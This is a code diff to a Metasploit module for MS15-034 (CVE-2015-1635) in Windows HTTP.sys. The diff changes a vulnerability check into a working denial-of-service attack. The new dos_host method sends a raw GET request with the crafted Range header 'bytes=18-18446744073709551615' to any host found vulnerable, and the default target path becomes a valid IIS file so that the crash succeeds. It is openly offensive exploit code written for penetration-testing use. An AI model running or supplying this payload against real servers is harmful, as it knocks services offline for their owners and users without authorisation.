@@ -7,48 +7,76 @@ require 'msf/core'
 
 class Metasploit3 < Msf::Auxiliary
 
+  # Watch out, dos all the things
   include Msf::Auxiliary::Scanner
   include Msf::Exploit::Remote::HttpClient
+  include Msf::Auxiliary::Dos
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'MS15-034 HTTP Protocol Stack Request Handling Vulnerability',
+      'Name'           => 'MS15-034 HTTP Protocol Stack Request Handling Denial-of-Service',
       'Description'    => %q{
         This module will check if your hosts are vulnerable to CVE-2015-1635 (MS15-034). A
         vulnerability in the HTTP Protocol stack (HTTP.sys) that could result in arbitrary code
-        execution. Please note this module could potentially cause a denail-of-service against
-        the servers you're testing.
+        execution. This module will try to cause a denail-of-service.
+
+        Please note that you must supply a valid file resource for the TARGETURI option.
+        By default, IIS may come with these settings that you could try: iisstart.htm,
+        welcome.png, iis-85.png, etc.
       },
       'Author'         =>
         [
-          'Bill Finlayson', # He did all the work (see the pastebin code), twitter: @hectorh56193716
-          'sinn3r'          # MSF version of bill's work
+          # Bill did all the work (see the pastebin code), twitter: @hectorh56193716
+          'Bill Finlayson',
+          # MSF. But really, these people made it happen:
+          # https://github.com/rapid7/metasploit-framework/pull/5150
+          'sinn3r'
         ],
       'References'     =>
         [
           ['CVE', '2015-1635'],
           ['MSB', 'MS15-034'],
-          ['URL', 'http://pastebin.com/ypURDPc4']
+          ['URL', 'http://pastebin.com/ypURDPc4'],
+          ['URL', 'https://github.com/rapid7/metasploit-framework/pull/5150']
         ],
       'License'        => MSF_LICENSE
     ))
 
     register_options(
       [
-        OptString.new('TARGETURI', [true, 'The base path', '/'])
+        OptString.new('TARGETURI', [true, 'A valid file resource', '/welcome.png'])
       ], self.class)
 
     deregister_options('RHOST')
   end
 
   def run_host(ip)
-    code = check_host(ip)
-    case code
-    when Exploit::CheckCode::Vulnerable
-      print_good("#{ip}:#{rport} - #{code.last}")
+    if check_host(ip) == Exploit::CheckCode::Vulnerable
+      dos_host(ip)
     else
-      print_status("#{ip}:#{rport} - #{code.last}")
+      print_status("#{ip}:#{rport} - Probably not vulnerable, will not dos it.")
     end
+  end
+
+  def dos_host(ip)
+    # In here we have to use Rex because if we dos it, it causes our module to hang too
+    uri = normalize_uri(target_uri.path)
+    begin
+      cli = Rex::Proto::Http::Client.new(ip)
+      cli.connect
+      req = cli.request_raw({
+        'uri' => uri,
+        'method' => 'GET',
+        'vhost'  => 'stuff',
+        'headers' => {
+          'Range' => 'bytes=18-18446744073709551615'
+        }
+      })
+      cli.send_request(req)
+    rescue ::Errno::EPIPE, ::Timeout::Error
+      # Same exceptions the HttpClient mixin catches
+    end
+    print_status("#{ip}:#{rport} - DOS request sent")
   end
 
   def check_host(ip)
@@ -62,7 +90,7 @@ class Metasploit3 < Msf::Auxiliary
     end
 
     if res.code == 404
-      print_error("#{ip}:#{rport} - URI must be a valid resource")
+      vprint_error("#{ip}:#{rport} - You got a 404. URI must be a valid resource.")
       return
     end
 
